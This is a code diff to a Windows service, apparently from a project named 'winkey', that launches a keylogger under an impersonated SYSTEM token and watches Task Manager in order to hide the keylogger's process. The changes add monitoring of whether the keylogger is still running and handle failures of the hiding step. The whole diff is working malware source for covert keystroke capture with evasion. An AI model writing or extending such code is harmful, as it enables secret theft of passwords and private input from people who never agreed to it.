@@ -23,11 +23,12 @@ VOID SvcInit(DWORD ac, LPTSTR *av)
 {
     (void)ac;
     PROCESS_INFORMATION keylogInfo;
-    char *taskmgr = "Taskmgr.exe";
     HANDLE hThread = NULL;
     DWORD taskmgrPID = 1;
     DWORD taskmgrPIDtmp = 1;
+    int exitCode;
 
+    ZeroMemory(&keylogInfo, sizeof(keylogInfo));
     // un event sera cree lorsque le service stoppera
     svcStopEvt = CreateEvent(NULL, TRUE, FALSE, NULL);
     if (svcStopEvt == NULL)
@@ -41,7 +42,18 @@ VOID SvcInit(DWORD ac, LPTSTR *av)
     ImpersonateSystemTokenAndLaunchKeylogger(&keylogInfo, atoi(av[1]));
     while (1)
     {
-        taskmgrPID =  GetPIDByProcName(taskmgr);
+        if (GetExitCodeProcess(keylogInfo.hProcess, (LPDWORD)&exitCode) == TRUE)
+        {
+            if (exitCode != STILL_ACTIVE)
+            {
+                log("winkey a quitte.");
+                CloseHandle(keylogInfo.hProcess);
+                CloseHandle(keylogInfo.hThread);
+                ReportSvcStatus(SERVICE_STOPPED, exitCode, 0);
+                exit(1);
+            }
+        }
+        taskmgrPID =  GetPIDByProcName(TASKMGR_NAME);
         if (taskmgrPID != 1 && taskmgrPID != taskmgrPIDtmp)
         {
             taskmgrPIDtmp = taskmgrPID;
@@ -51,10 +63,22 @@ VOID SvcInit(DWORD ac, LPTSTR *av)
         if (hThread)
         {
             DWORD threadExit = WaitForSingleObject(hThread, 1);
-            if (threadExit == WAIT_OBJECT_0)
+            switch (threadExit)
             {
-                CloseHandle(hThread);
-                taskmgrPIDtmp = 1;
+                case WAIT_OBJECT_0:
+                    CloseHandle(hThread);
+                    taskmgrPIDtmp = 1;
+                    break;
+                case WAIT_FAILED:
+                case WAIT_ABANDONED:
+                    log("WaitForSingleObject failed. Hide process probably failed too.");
+                    CloseHandle(hThread);
+                    taskmgrPIDtmp = 1;
+                    break;
+                case WAIT_TIMEOUT:
+                    break;
+                default:
+                break;
             }
         }
         DWORD stopEvt = WaitForSingleObject(svcStopEvt, 1);
